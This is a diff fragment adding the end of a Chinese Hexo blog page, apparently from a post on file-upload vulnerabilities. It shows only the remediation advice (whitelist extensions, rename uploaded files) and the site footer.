+<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>针对文件上传的修复，笔者给出以下这两点建议。</p>
+<ul>
+<li>通过白名单的方式判断文件后缀是否合法。</li>
+<li>对上传后的文件进行重命名，例如rand(10,99).date(“YmdHis”).”jpg”。</li>
+</ul>
+
+    <footer>
+    <span id="busuanzi_container_site_pv" style="display: inline;"></span>
+    <span>👁<span id="busuanzi_value_site_pv"></span></span>
+    <div class="padding border border-sub border-dotted fadein-right">
+        <span style="color:aliceblue">👤<span id="busuanzi_value_site_uv"></span></span>
+    </div>
+    <span>
+        由 <a target="_blank" rel="noopener" href="https://hexo.io" alt="Hexo">
+            <p class="hover-underline night" style="display: inline;">Hexo</p>
+        </a> 驱动
+        <p style="display: inline; color: red;">❤</p>
+        <a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang" alt="Wang">
+            <p class="hover-underline night" style="display: inline;">Wang</p>
+        </a> 主题构建
+    </span>
+
+    <!-- 带图片的链接 -->
+    <div class="footer-links">
+        
+    </div>
+
+    <!-- 纯文本链接 -->
+    <div class="footer-text-links">
+        
+    </div>
+</footer>
+    
+<script src="/js/background.js"></script>
+    
+</main>
+</body>
+</html>
